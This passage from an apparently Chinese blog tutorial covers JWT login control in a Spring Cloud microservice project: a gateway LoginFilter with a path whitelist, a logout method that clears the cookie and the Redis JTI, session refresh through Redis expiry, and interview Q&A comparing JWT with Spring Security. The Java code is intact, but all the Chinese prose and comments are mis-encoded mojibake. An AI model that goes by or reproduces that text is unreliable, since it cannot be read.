class="string">&quot;æœåŠ¡è§£æç”¨æˆ·ä¿¡æ¯å¤±è´¥&quot;</span>, e);</span><br><span class="line">            <span class="comment">// å†…éƒ¨å¼‚å¸¸ï¼Œè¿”å›500</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.INTERNAL_SERVER_ERROR);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// æœ€é«˜ä¼˜å…ˆçº§</span></span><br><span class="line">        <span class="keyword">return</span> Ordered.HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ä¸€ä¸ªè¯·æ±‚æ˜¯å¦æ˜¯ç™½åå•ä¸­çš„è¯·æ±‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request è¯·æ±‚å¯¹è±¡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> trueï¼šæ˜¯ç™½åå•è¯·æ±‚ï¼› falseï¼šä¸æ˜¯ç™½åå•è¯·æ±‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAllowRequest</span><span class="params">(ServerHttpRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.è·å–å½“å‰è¯·æ±‚çš„pathå’Œmethod</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPath().toString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethodValue();</span><br><span class="line">        <span class="comment">// 2.éå†ç™½åå•</span></span><br><span class="line">        Map&lt;String, Set&lt;String&gt;&gt; allowRequests = filterProp.getAllowRequests();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Set&lt;String&gt;&gt; entry : allowRequests.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 3.è·å–å…è®¸çš„pathå’Œå…è®¸çš„methods</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">allowPathPrefix</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            Set&lt;String&gt; allowMethods = entry.getValue();</span><br><span class="line">            <span class="comment">// 4.åˆ¤æ–­æ˜¯å¦å…è®¸</span></span><br><span class="line">            <span class="keyword">if</span> (StringUtils.startsWith(path, allowPathPrefix) &amp;&amp; allowMethods.contains(method)) &#123;</span><br><span class="line">                <span class="comment">// æ˜¯è®¸å¯çš„è·¯å¾„ï¼Œè¿”å›true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ä¸æ˜¯ç™½åå•è¯·æ±‚ï¼Œè¿”å›false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="é€€å‡ºç™»å½•-1"><a href="#é€€å‡ºç™»å½•-1" class="headerlink" title="é€€å‡ºç™»å½•"></a>é€€å‡ºç™»å½•</h4><p>é€€å‡ºç™»å½•çš„æ€è·¯ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022691.png" alt="image-20200325151940333"></p>
<p>æµç¨‹ï¼š</p>
<ul>
<li>ç”¨æˆ·å‘è¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼Œæºå¸¦cookie</li>
<li>æœåŠ¡ç«¯æ¥æ”¶è¯·æ±‚ï¼Œè·å–cookie</li>
<li>æ ¡éªŒcookieä¸­çš„tokençš„æœ‰æ•ˆæ€§ï¼Œå¹¶è·å–cookieä¸­çš„token</li>
<li>å¦‚æœæœ‰æ•ˆï¼Œåˆ é™¤cookieï¼ˆé‡æ–°å†™ä¸€ä¸ªcookieï¼ŒmaxAgeä¸º0ï¼‰</li>
<li>åˆ é™¤redisä¸­çš„JTI</li>
</ul>
<p>é€€å‡ºç™»å½•çš„è¯·æ±‚ä¿¡æ¯ï¼š</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼šPOST</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;user&#x2F;logout</li>
<li>è¯·æ±‚å‚æ•°ï¼šæ— ï¼Œæºå¸¦cookie</li>
<li>è¿”å›å€¼ï¼šæ— </li>
</ul>
<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.web</code>åŒ…çš„<code>UserAuthController</code>ä¸­ï¼Œæ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é€€å‡ºç™»å½•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request è¯·æ±‚å‚æ•°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response å“åº”æ•°æ®ï¼Œå†™cookieç”¨</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ— </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;logout&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line">    userAuthService.logout(request, response);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.service</code>åŒ…çš„<code>UserAuthService</code>ä¸­ï¼Œæ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.service.impl</code>åŒ…çš„<code>UserAuthServiceImpl</code>ä¸­ï¼Œæ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.è·å–ç”¨æˆ·cookie</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">    <span class="comment">// 2.æ ¡éªŒcookieä¸­çš„tokençš„æœ‰æ•ˆæ€§</span></span><br><span class="line">    Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        payload = JwtUtils.getInfoFromToken(token, prop.getPublicKey(), UserInfo.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 3.å¦‚æœæ— æ•ˆï¼Œä»€ä¹ˆéƒ½ä¸åš</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.å¦‚æœæœ‰æ•ˆï¼Œåˆ é™¤cookieï¼ˆé‡æ–°å†™ä¸€ä¸ªcookieï¼ŒmaxAgeä¸º0ï¼‰</span></span><br><span class="line">    CookieUtils.deleteCookie(UserTokenConstants.COOKIE_NAME, UserTokenConstants.DOMAIN, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.åˆ é™¤redisä¸­çš„JTI</span></span><br><span class="line">    <span class="comment">// 5.1.è·å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">    <span class="comment">// 5.2.åˆ é™¤redisæ•°æ®</span></span><br><span class="line">    redisTemplate.delete(RedisConstants.JTI_KEY_PREFIX + userInfo.getId());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="ç™»å½•çŠ¶æ€åˆ·æ–°"><a href="#ç™»å½•çŠ¶æ€åˆ·æ–°" class="headerlink" title="ç™»å½•çŠ¶æ€åˆ·æ–°"></a>ç™»å½•çŠ¶æ€åˆ·æ–°</h3><h4 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h4><p>æˆ‘ä»¬ç­¾å‘ç»™ç”¨æˆ·çš„tokenæ˜¯æ°¸ä¹…æœ‰æ•ˆçš„ï¼Œä½†æ˜¯Redisçš„æ ‡ç¤ºåªå­˜æ´»30åˆ†é’Ÿã€‚</p>
<p>å½“ç”¨æˆ·ç™»å½•åï¼Œæµè§ˆç½‘é¡µæ—¶ï¼Œå¾ˆå¿«30åˆ†é’Ÿå°±ä¼šè¿‡å»ï¼Œç™»å½•å¤±æ•ˆã€‚ç”¨æˆ·ä»˜æ¬¾æ—¶æç¤ºè¯´æ‚¨å°šæœªç™»å½•ï¼Œè¿™æ ·ç”¨æˆ·ä½“éªŒä¼šå¾ˆå·®ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦åšåˆ°ï¼š</p>
<ul>
<li>åªè¦ç”¨æˆ·ä¸€ç›´è®¿é—®ï¼Œåˆ™ç™»å½•çŠ¶æ€ä¸€ç›´å­˜åœ¨ï¼ŒRedisä¸ä¼šè¿‡æœŸ</li>
<li>ç”¨æˆ·è¶…è¿‡30åˆ†é’Ÿä¸è®¿é—®ï¼Œåˆ™ç™»å½•çŠ¶æ€å¤±æ•ˆ</li>
</ul>
<p>å¦‚ä½•å®ç°ï¼Ÿ</p>
<p>æ˜¾ç„¶ï¼Œéœ€è¦åœ¨ç”¨æˆ·æ¯æ¬¡è®¿é—®æˆ‘ä»¬çš„å¾®æœåŠ¡æ—¶ï¼Œéƒ½å»åˆ·æ–°Redisçš„ç¼“å­˜å³å¯ã€‚</p>
<p>è€Œç”¨æˆ·çš„ä¸€åˆ‡è¯·æ±‚éƒ½ä¼šç»è¿‡ç½‘å…³Zuulçš„<code>LoginFilter</code>è¿‡æ»¤å™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ç½‘å…³çš„<code>LoginFilter</code>ä¸­åŠ å…¥åˆ·æ–°Redisçš„è¶…æ—¶æ—¶é—´ä¸šåŠ¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022692.png" alt="image-20200325152242814"></p>
<h3 id="2-2-2-ä»£ç å®ç°"><a href="#2-2-2-ä»£ç å®ç°" class="headerlink" title="2.2.2.ä»£ç å®ç°"></a>2.2.2.ä»£ç å®ç°</h3><p>ä¿®æ”¹<code>ly-gateway</code>çš„<code>com.leyou.gateway.filter</code>ä¸­çš„<code>LoginUserFilter</code>ä¸­çš„filteræ–¹æ³•ï¼Œæ·»åŠ åˆ·æ–°tokenæœ‰æ•ˆæ—¶é—´çš„é€»è¾‘ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022693.png" alt="image-20200323001117074"></p>
<p>å®Œæ•´ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.RedisConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.FilterProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.ExpiredJwtException;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.security.SignatureException;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.CollectionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.MultiValueMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FilterProperties filterProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp, FilterProperties filterProp, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">        <span class="built_in">this</span>.filterProp = filterProp;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.è·å–Requestå¯¹è±¡</span></span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="comment">// 2.è·å–cookieä¸­çš„token</span></span><br><span class="line">        MultiValueMap&lt;String, HttpCookie&gt; cookies = request.getCookies();</span><br><span class="line">        List&lt;HttpCookie&gt; cookieList = cookies.get(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(cookieList)) &#123;</span><br><span class="line">                <span class="comment">// æ²¡æœ‰tokenï¼Œæ‹¦æˆªè¯·æ±‚</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;æœªç™»å½•ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookieList.get(<span class="number">0</span>).getValue();</span><br><span class="line">            <span class="comment">// 3.é€šè¿‡JWTå¯¹tokenè¿›è¡Œè§£æ</span></span><br><span class="line">            Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line">            <span class="comment">// 3.1.è·å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">            <span class="comment">// 3.2.è·å–redisä¸­çš„JTI</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> RedisConstants.JTI_KEY_PREFIX + userInfo.getId();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cacheJTI</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">            <span class="comment">// 3.3.æ¯”è¾ƒå½“å‰tokençš„jtiå’Œredisä¸­çš„JTI</span></span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.equals(cacheJTI, payload.getId())) &#123;</span><br><span class="line">                <span class="comment">// æ— æ•ˆçš„tokenï¼Œè¿”å›400</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;æœªç™»å½•æˆ–è€…ç™»å½•å·²ç»è¿‡æœŸ&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 4.åˆ·æ–°tokenæœ‰æ•ˆæœŸ</span></span><br><span class="line">            redisTemplate.expire(key, RedisConstants.TOKEN_EXPIRE_MINUTES, TimeUnit.MINUTES);</span><br><span class="line">            <span class="comment">// TODO æƒé™åˆ¤æ–­</span></span><br><span class="line">            log.info(<span class="string">&quot;ç”¨æˆ·&#123;&#125;æ­£åœ¨è®¿é—®èµ„æºï¼š&#123;&#125;&quot;</span>, userInfo.getUsername(), request.getPath());</span><br><span class="line">            <span class="comment">// æ”¾è¡Œ</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExpiredJwtException | SignatureException e) &#123;</span><br><span class="line">            <span class="comment">// æ²¡æœ‰ç™»å½•ï¼Œåˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å¦æ˜¯ç™½åå•è¯·æ±‚</span></span><br><span class="line">            <span class="keyword">if</span> (isAllowRequest(request)) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ï¼Œæ”¾è¡Œ</span></span><br><span class="line">                <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">            &#125;</span><br><span class="line">            log.error(<span class="string">&quot;ç”¨æˆ·éæ³•è®¿é—®èµ„æºï¼š&#123;&#125;&quot;</span>, request.getPath());</span><br><span class="line">            <span class="comment">//  - è§£æä¸é€šè¿‡ï¼Œè¿”å›401</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;æœåŠ¡è§£æç”¨æˆ·ä¿¡æ¯å¤±è´¥&quot;</span>, e);</span><br><span class="line">            <span class="comment">// å†…éƒ¨å¼‚å¸¸ï¼Œè¿”å›500</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.INTERNAL_SERVER_ERROR);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// æœ€é«˜ä¼˜å…ˆçº§</span></span><br><span class="line">        <span class="keyword">return</span> Ordered.HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ä¸€ä¸ªè¯·æ±‚æ˜¯å¦æ˜¯ç™½åå•ä¸­çš„è¯·æ±‚</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request è¯·æ±‚å¯¹è±¡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> trueï¼šæ˜¯ç™½åå•è¯·æ±‚ï¼› falseï¼šä¸æ˜¯ç™½åå•è¯·æ±‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAllowRequest</span><span class="params">(ServerHttpRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.è·å–å½“å‰è¯·æ±‚çš„pathå’Œmethod</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPath().toString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethodValue();</span><br><span class="line">        <span class="comment">// 2.éå†ç™½åå•</span></span><br><span class="line">        Map&lt;String, Set&lt;String&gt;&gt; allowRequests = filterProp.getAllowRequests();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Set&lt;String&gt;&gt; entry : allowRequests.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 3.è·å–å…è®¸çš„pathå’Œå…è®¸çš„methods</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">allowPathPrefix</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            Set&lt;String&gt; allowMethods = entry.getValue();</span><br><span class="line">            <span class="comment">// 4.åˆ¤æ–­æ˜¯å¦å…è®¸</span></span><br><span class="line">            <span class="keyword">if</span> (StringUtils.startsWith(path, allowPathPrefix) &amp;&amp; allowMethods.contains(method)) &#123;</span><br><span class="line">                <span class="comment">// æ˜¯è®¸å¯çš„è·¯å¾„ï¼Œè¿”å›true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ä¸æ˜¯ç™½åå•è¯·æ±‚ï¼Œè¿”å›false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="é¢è¯•å¸¸è§é—®é¢˜"><a href="#é¢è¯•å¸¸è§é—®é¢˜" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><h3 id="jwtå’Œsecurityçš„å¯¹æ¯”ï¼š"><a href="#jwtå’Œsecurityçš„å¯¹æ¯”ï¼š" class="headerlink" title="jwtå’Œsecurityçš„å¯¹æ¯”ï¼š"></a>jwtå’Œsecurityçš„å¯¹æ¯”ï¼š</h3><p>JWTçš„ï¼š</p>
<ul>
<li><p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ— éœ€å†æœåŠ¡ç«¯å­˜å‚¨ç”¨æˆ·æ•°æ®ï¼Œå‡è½»æœåŠ¡ç«¯å‹åŠ›</li>
<li>è½»é‡çº§ï¼Œjsoné£æ ¼ï¼Œæ¯”è¾ƒç®€å•</li>
<li>è·¨è¯­è¨€</li>
</ul>
</li>
<li><p>æœ‰åˆ©äºæ°´å¹³æ‰©å±•</p>
</li>
<li><p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>tokenä¸€æ—¦ç­¾å‘ï¼Œæ— æ³•ä¿®æ”¹<ul>
<li>æ— æ³•æ›´æ–°tokenæœ‰æ•ˆæœŸï¼Œç”¨æˆ·ç™»å½•çŠ¶æ€åˆ·æ–°éš¾ä»¥å®ç°</li>
<li>æ— æ³•é”€æ¯ä¸€ä¸ªtokenï¼ŒæœåŠ¡ç«¯ä¸èƒ½å¯¹ç”¨æˆ·çŠ¶æ€è¿›è¡Œç»å¯¹æ§åˆ¶</li>
</ul>
</li>
<li>ä¸åŒ…å«æƒé™æ§åˆ¶</li>
</ul>
</li>
</ul>
<p>SpringSecurityï¼š</p>
<ul>
<li><p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç”¨æˆ·ä¿¡æ¯ä¿å­˜å†æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å¯ä»¥å¯¹ç”¨æˆ·çŠ¶æ€ç»å¯¹æ§åˆ¶</li>
<li>åŸºäºSpringï¼Œæ— ç¼æ•´åˆï¼Œä¿®æ”¹ç™»å½•é€»è¾‘ï¼Œå…¶å®å°±æ˜¯æ·»åŠ è¿‡æ»¤å™¨</li>
<li>æ•´åˆæƒé™ç®¡ç†</li>
</ul>
</li>
<li><p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>é™å®šäº†è¯­è¨€</li>
<li>å®ç°å¤æ‚ï¼ŒåŸºäºä¸€è¿ä¸²çš„è¿‡æ»¤å™¨é“¾</li>
<li>éœ€è¦å†æœåŠ¡ç«¯ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œå¢åŠ æœåŠ¡ç«¯å‹åŠ›</li>
<li>ä¾èµ–äºtomcatçš„HttpSessionã€å¦‚æœæ˜¯åˆ†å¸ƒå¼é¡¹ç›®ï¼Œsessionä¸å…±äº«ï¼Œç™»å½•å¤±æ•ˆï¼Œéœ€è¦å€ŸåŠ©äºSpringSessionï¼Œå®ç°å…±äº«sessionæ•ˆæœï¼ˆåˆ©ç”¨redisä»£æ›¿tomcatçš„sessionï¼‰</li>
</ul>
</li>
</ul>
<h3 id="ç™»å½•æ§åˆ¶é—®é¢˜"><a href="#ç™»å½•æ§åˆ¶é—®é¢˜" class="headerlink" title="ç™»å½•æ§åˆ¶é—®é¢˜"></a>ç™»å½•æ§åˆ¶é—®é¢˜</h3><ul>
<li><p>ä½ ä»¬ä½¿ç”¨JWTåšç™»å½•å‡­è¯ï¼Œå¦‚ä½•è§£å†³tokenæ³¨é”€é—®é¢˜</p>
<p>ç­”ï¼šjwtçš„ç¼ºé™·æ˜¯tokenç”Ÿæˆåæ— æ³•ä¿®æ”¹ï¼Œå› æ­¤æ— æ³•è®©tokenå¤±æ•ˆã€‚åªèƒ½é‡‡ç”¨å…¶å®ƒæ–¹æ¡ˆæ¥å¼¥è¡¥ï¼ŒåŸºæœ¬æ€è·¯å¦‚ä¸‹ï¼š</p>
<p>  1ï¼‰ç”¨æˆ·ç™»å½•åï¼Œç”ŸæˆJWTï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·èº«ä»½</p>
<p>  2ï¼‰ä»¥ç”¨æˆ·idä¸ºkeyï¼ŒæŠŠJWTçš„idå­˜å…¥redisï¼Œåªæœ‰redisä¸­æœ‰idçš„JWTï¼Œæ‰æ˜¯æœ‰æ•ˆçš„JWT</p>
<p>  3ï¼‰å¹¶ä¸”ç»™Redisè®¾ç½®æœ‰æ•ˆæœŸï¼Œæœ‰æ•ˆæœŸåˆ°è‡ªåŠ¨åˆ é™¤</p>
<p>  4ï¼‰é€€å‡ºç™»å½•æ—¶ï¼ŒæŠŠIDä»Redisåˆ é™¤å³å¯</p>
</li>
<li><p>æ€ä¹ˆè§£å†³ç™»å½•è¶…æ—¶åçš„ç™»å½•ç»­ç­¾é—®é¢˜ï¼Ÿ</p>
<p>ç­”ï¼šåˆ¤æ–­ç™»å½•æ˜¯å¦è¶…æ—¶çš„æ ‡å‡†æ˜¯redisï¼Œè€Œä¸æ˜¯JWTï¼Œå› æ­¤æ¯æ¬¡ç”¨æˆ·è®¿é—®ç½‘å…³ï¼Œæˆ‘ä»¬éƒ½ä¼šåˆ·æ–°redisçš„æ•°æ®æœ‰æ•ˆæœŸï¼Œä¿è¯ç™»å½•çŠ¶æ€ä¸æ–­ã€‚</p>
</li>
<li><p>å¦‚ä½•è§£å†³å¼‚åœ°ç™»å½•æˆ–è·¨è®¾å¤‡ç™»å½•é—®é¢˜ï¼Ÿ</p>
<p>ç­”ï¼š</p>
<p>æ–¹æ¡ˆä¸€ï¼šä¸å…è®¸å¤šç«¯ç™»å½•</p>
<p>å¦‚æœè´¦æˆ·åœ¨ç¬¬äºŒä¸ªè®¾å¤‡ç™»å½•ï¼Œè‡ªç„¶ä¼šå°†redisä¸­çš„JWTè¦†ç›–ï¼Œé‚£ä¹ˆä¹‹å‰çš„ç™»å½•å‡­è¯å°±æˆäº†æ— æ•ˆå‡­è¯ã€‚</p>
<p>æ–¹æ¡ˆäºŒï¼šå…è®¸å¤šç«¯ç™»å½•</p>
<p>å­˜å…¥redisæ—¶ï¼Œredisçš„ç±»å‹å¯ä»¥é€‰æ‹©setï¼Œè¿™æ ·ä¸€ä¸ªç”¨æˆ·å¯ä»¥å…·å¤‡å¤šä¸ªJWTçš„idï¼Œå®ç°å¤šç«¯ç™»å½•ã€‚</p>
</li>
</ul>
<h3 id="cookieå®‰å…¨é—®é¢˜"><a href="#cookieå®‰å…¨é—®é¢˜" class="headerlink" title="cookieå®‰å…¨é—®é¢˜"></a>cookieå®‰å…¨é—®é¢˜</h3><ul>
<li><p>å¦‚ä½•è§£å†³tokenè¢«ç¯¡æ”¹é—®é¢˜ï¼Ÿ</p>
<ul>
